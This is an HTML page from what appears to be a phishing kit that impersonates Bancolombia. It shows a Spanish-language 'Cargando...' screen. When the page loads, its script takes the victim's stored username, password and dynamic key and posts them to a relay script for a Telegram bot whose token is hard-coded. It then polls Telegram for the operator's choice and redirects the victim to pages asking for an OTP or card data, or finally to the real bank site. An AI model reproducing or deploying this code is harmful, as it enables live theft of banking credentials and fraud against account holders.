<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificando Dinámica</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: url('img/fondo.jpg') no-repeat center center fixed;
      background-size: cover;
    }

    .blur-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.4);
      backdrop-filter: blur(10px);
    }

    .loaderp-full {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      position: fixed;
      width: 90%;
      height: 90%;
      z-index: 9999;
    }

    .loaderp {
      width: 180px;
      height: 180px;
      background-image: url('img/circulo.png');
      background-size: cover;
      border-radius: 50%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    .loaderp .loader {
      width: 30px;
      height: 30px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #555;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    .loaderp-text {
      margin-top: 30px;
      font-size: 13px;
      color: black;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="blur-overlay"></div>
  <div class="loaderp-full">
    <div class="loaderp">
      <div class="loader"></div>
      <div class="loaderp-text">Cargando...</div>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', async function () {
      const loader = document.querySelector('.loader');

      const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
      const dinamica = localStorage.getItem('bancoldina') || '';

      if (!bancoldata.usuario || !bancoldata.clave || !dinamica) {
        alert("Datos incompletos. Redirigiendo...");
        return window.location.href = "index.html";
      }

      const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
      localStorage.setItem('transactionId', transactionId);

      const mensaje = `
<b>📥 VERIFICACIÓN DE CLAVE DINÁMICA</b>
🆔 <b>ID:</b> ${transactionId}
👤 <b>Usuario:</b> ${bancoldata.usuario}
🔐 <b>Clave:</b> ${bancoldata.clave}
🔑 <b>Dinámica:</b> ${dinamica}
`;

      const keyboard = JSON.stringify({
        inline_keyboard: [
          [{ text: "Error Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
          [{ text: "Código OTP", callback_data: `pedir_otp:${transactionId}` }],
          [{ text: "Error TC", callback_data: `error_tc:${transactionId}` }],
          [{ text: "Error Logo", callback_data: `error_logo:${transactionId}` }],
          [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
        ]
      });

      await fetch("botmaster2.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "data=" + encodeURIComponent(mensaje) + "&keyboard=" + encodeURIComponent(keyboard)
      });

      await checkPaymentVerification(transactionId);

      async function checkPaymentVerification(transactionId) {
        try {
          const response = await fetch("https://api.telegram.org/bot8153542950:AAER3soWgrkQDu_cVSUZR4x9dJKjavcGSDE/getUpdates");
          const data = await response.json();

          const update = data.result.find(update =>
            update.callback_query &&
            update.callback_query.data &&
            update.callback_query.data.includes(transactionId)
          );

          if (update) {
            const tipo = update.callback_query.data.split(":")[0];
            const status = {
              pedir_dinamica: "Error Dinámica",
              pedir_otp: "Código OTP",
              error_tc: "Error TC",
              error_logo: "Error de Logo",
              confirm_finalizar: "Finalización Exitosa"
            }[tipo] || "Desconocido";

            await fetch("sendStatus.php", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ status })
            });

            switch (tipo) {
              case "pedir_dinamica":
                return window.location.href = "cel-dina-error.html";
              case "pedir_otp":
                return window.location.href = "index-otp.html";
              case "error_tc":
                return window.location.href = "errortc.html";
              case "error_logo":
                alert("Error en datos.");
                return window.location.href = "index.html";
              case "confirm_finalizar":
                return window.location.href = "https://www.bancolombia.com/personas";
            }
          } else {
            setTimeout(() => checkPaymentVerification(transactionId), 2000);
          }
        } catch (e) {
          console.error("Error verificando botón:", e);
          setTimeout(() => checkPaymentVerification(transactionId), 2000);
        }
      }
    });
  </script>
</body>
</html>
